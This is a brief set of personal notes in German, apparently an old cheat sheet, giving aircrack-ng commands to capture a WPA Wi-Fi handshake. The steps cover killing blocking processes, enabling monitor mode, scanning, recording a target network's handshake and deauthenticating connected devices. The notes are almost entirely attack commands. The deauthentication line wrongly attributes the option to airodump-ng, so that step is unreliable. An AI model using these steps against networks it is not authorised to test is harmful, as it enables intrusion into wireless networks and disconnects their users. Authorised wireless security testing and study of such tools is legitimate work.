Meine uralte Dokumentation als ich im Hacker Fieber war.
#TODO aircrack-ng aufarbeiten und updaten
# WLAN Hash abgreifen
``` bash
# Nach Programmen suchen die den Monitor Modus aufhalten.
airmon-ng check
# Diese Programme beenden
airmon-ng check kill
# Monitor Modus der Wlan Karte starten.
airmon-ng start <WlanKarte>
# Netzwerke in Reichweite anzeigen
airodump-ng <WlanKarte>
# Handshake abgreifen starten
airodump-ng --bssid <BSSID> -c <Channel> --write <Dateiname> <WlanKarte>
# Geräte im Netzwerk deathentifizieren
airodump-ng --deauth <Anzahl> -a <BSSID> <WlanKarte>
```

# WLAN 
# Siehe
- https://www.aircrack-ng.org/doku.php?id=Main#introduction
- https://www.aircrack-ng.org/doku.php?id=Main#documentation